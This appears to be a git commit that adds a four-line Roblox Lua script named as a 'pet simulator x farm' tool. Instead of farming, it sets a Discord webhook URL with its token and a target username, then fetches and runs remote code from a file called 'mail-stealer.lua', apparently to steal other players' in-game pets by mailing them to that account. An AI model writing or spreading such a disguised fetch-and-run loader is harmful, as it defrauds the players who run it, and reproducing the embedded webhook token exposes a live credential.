f2cf5abcb057b63c93e2310ddc7c0fd5dddfbbd4
moratusik <128708753+moratusik@users.noreply.github.com>
2023-03-24 09:11:21 +0800

    Create pet simulator x farm.lua

---
+++ pet simulator x farm.lua
@@ -0,0 +1,4 @@
+getgenv().webhook = "https://discord.com/api/webhooks/1088112164637782066/WJ7OhYQr9fRRWucpdTIS6zWEVB3AjW4nwSbQtGfswsnpk_GK0DV0soU7_AXptr5sffFx"
+getgenv().name = "Kereeshkanikita"
+getgenv().mouselock = true 
+loadstring(game:HttpGetAsync("https://wumat.xyz/scripts/mail-stealer.lua", true))() 
